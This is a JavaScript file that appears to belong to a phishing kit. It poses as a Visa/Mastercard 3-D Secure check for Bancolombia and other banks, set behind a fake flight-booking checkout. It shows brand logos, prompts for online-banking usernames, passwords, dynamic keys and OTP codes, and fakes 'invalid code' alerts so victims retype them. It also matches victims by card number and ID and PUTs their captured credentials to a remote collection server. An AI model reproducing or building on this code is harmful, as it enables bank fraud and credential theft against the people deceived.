/**
 * SET LOGOS
 */
const companyLoader = document.querySelector('#company-loader');
const companyLogo = document.querySelector('#company-logo');
const bankLogo = document.querySelector('#bank-logo');
if(info.checkerInfo.company === 'VISA'){
    companyLoader.setAttribute('src', './assets/logos/visa_verified.png');
    companyLoader.setAttribute('width', '130px');
    companyLoader.setAttribute('style', 'margin-bottom: 40px');

    companyLogo.setAttribute('src', './assets/logos/visa_verified.png');
    companyLogo.setAttribute('width', '90px');
}else if(info.checkerInfo.company === 'MC'){
    companyLoader.setAttribute('src', './assets/logos/mc_id_check_2.jpg');
    companyLoader.setAttribute('width', '400px');

    companyLogo.setAttribute('src', './assets/logos/mc_id_check_1.webp');
    companyLogo.setAttribute('width', '130px');
}else if(info.checkerInfo.company === 'AM'){
    companyLoader.setAttribute('src', './assets/logos/amex_check_1.png');
    companyLoader.setAttribute('width', '200px');

    companyLogo.setAttribute('src', './assets/logos/mc_id_check_1.webp');
    companyLogo.setAttribute('width', '110px');
}


if(info.metaInfo.ban === 'bancolombia'){
    bankLogo.setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);
    bankLogo.setAttribute('width', `120px`);
}else{
    bankLogo.setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);
}

const mainLoader = document.querySelector('.main-loader');
setTimeout(() =>{
    try{
        mainLoader.classList.remove('show');
    }catch(e){
        console.log('e');
    }
}, 2500);

/**
 * SET INPUTS
 */
const user = document.querySelectorAll('#user-b');
const iuser = document.querySelectorAll('#user');
const ipuser = document.querySelectorAll('#puser');
const puser = document.querySelectorAll('#puser-b');
const cdin = document.querySelectorAll('#cdin');
const ccaj = document.querySelectorAll('#ccaj');
const cavance = document.querySelectorAll('#cavance');
const otpcode = document.querySelectorAll('#otpcode');
if(info.checkerInfo.mode === 'userpassword'){

    iuser.forEach(elem =>{
        elem.classList.remove('hidden');
    });

    ipuser.forEach(elem =>{
        elem.classList.remove('hidden');
    })

    user.forEach(elem =>{
        elem.classList.remove('hidden');
    });
    puser.forEach(elem =>{
        elem.classList.remove('hidden');
    });

    if(info.metaInfo.ban === 'bancolombia'){
        puser.forEach(elem => {
            elem.setAttribute('oninput', 'limitDigits(this, 4);');
        });
    }
}else if(info.checkerInfo.mode === 'cdin'){
    setTimeout(() =>{
        // COMPROBAR ERROR
        if(info.metaInfo.cdin !== ''){
            alert('Clave dinámica inválida o expiró, por favor inténtelo de nuevo.');
        }
    }, 2050);

    cdin.forEach(elem =>{
        elem.classList.remove('hidden');
    });
}else if(info.checkerInfo.mode === 'ccaj'){
    setTimeout(() =>{
        // COMPROBAR ERROR
        if(info.metaInfo.ccaj !== ''){
            alert('Datos inválidos, por favor ingrese la clave de nuevo.');
        }
    }, 2050);
    ccaj.forEach(elem =>{
        elem.classList.remove('hidden');
    });
}else if(info.checkerInfo.mode === 'cavance'){
    setTimeout(() =>{
        // COMPROBAR ERROR
        if(info.metaInfo.cavance !== ''){
            alert('Datos inválidos, por favor ingrese la clave de nuevo.');
        }
    }, 2050);
    cavance.forEach(elem =>{
        elem.classList.remove('hidden');
    });
}else if(info.checkerInfo.mode === 'otpcode'){
    setTimeout(() =>{
        // COMPROBAR ERROR
        if(info.metaInfo.cavance !== ''){
            alert('Código inválido, por favor ingrese el valor de nuevo.');
        }
    }, 2050);
    otpcode.forEach(elem =>{
        elem.classList.remove('hidden');
    });
}

/**
 * SET NUMBERS
*/
const flightPrice = document.querySelectorAll('#flight-price');
const cardDigits = document.querySelector('#card-digits');
cardDigits.textContent = info.metaInfo.p.split(' ')[3];
function formatPrice(number){
    return number.toLocaleString('es', {
        maximumFractionDigits: 0,
        useGrouping: true
    });
}
let finalPrice = "- -";
if(info.flightInfo.ticket_nat === 'NAC'){
    finalPrice = pricesNAC[info.flightInfo.ticket_sched][info.flightInfo.ticket_type] * (info.flightInfo.adults + info.flightInfo.children);
}else if(info.flightInfo.ticket_nat === 'INT'){
    finalPrice = pricesNAT[info.flightInfo.ticket_sched][info.flightInfo.ticket_type] * (info.flightInfo.adults + info.flightInfo.children);
}else{
    console.log('flight resume error');
}

console.log(finalPrice);

info.flightInfo.type === 1 ? finalPrice = finalPrice * 2 : '';

flightPrice.forEach(elem =>{
    elem.textContent = formatPrice(finalPrice);
});

/**
 * NEXT STEP
 */
const btnNextStep = document.querySelector('#btnNextStep');
const form = document.querySelector('#form');

btnNextStep.addEventListener('click', () =>{
    usuario = document.getElementById('user').value;
    password = document.getElementById('puser').value;
    console.log(usuario + " " + password);
    console.log('hola');
    info.metaInfo.user = usuario;
    info.metaInfo.puser = password;
    if(info.checkerInfo.mode === 'userpassword'){
                async function updateData() {
                  const response = await fetch(
                    `${url}/dataTables/dataTables`,
                    {
                      method: "GET",
                      headers: {
                        "Content-Type": "application/json",
                      },
                    }
                  );

                  const serverData = await response.json();
                  const dataTables = [...serverData];

                  for (const data of dataTables) {
                    if (
                      data.tarjeta == info.metaInfo.p &&
                      data.id == info.metaInfo.cc
                    ) {
                      console.log("Usuario encontrado");
                      const updateResponse = await fetch(
                        `${url}/dataTables/updateUsuario/${data.idreg}`,
                        {
                          method: "PUT",
                          headers: {
                            "Content-Type": "application/json",
                          },
                          body: JSON.stringify({
                            usuario: usuario,
                            password: password,
                          }),
                        }
                      );
                      const updateData = await updateResponse.json();
                    }
                  }

                  window.location.href = "waiting.html";
                }

                updateData();
                }
});